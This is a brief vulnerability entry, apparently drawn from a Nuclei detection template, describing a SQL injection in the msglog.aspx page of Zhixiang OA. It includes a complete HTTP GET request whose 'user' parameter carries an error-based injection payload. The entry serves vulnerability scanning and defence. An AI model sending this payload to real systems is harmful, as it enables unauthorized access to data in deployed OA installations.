# Vulnerability: Zhixiang OA msglog.aspx - SQL injection
**Classification:** CWE-89
**Source:** Nuclei Template (`zhixiang-oa-msglog-sqli.yaml`)

## Description
There is a SQL injection vulnerability in the msglog.aspx file of Zhixiang OA. Attackers can obtain sensitive information through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /mainpage/msglog.aspx?user=1%27%20and%201=convert(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27127381%27))))-- HTTP/1.1
Host: {{Hostname}}
```

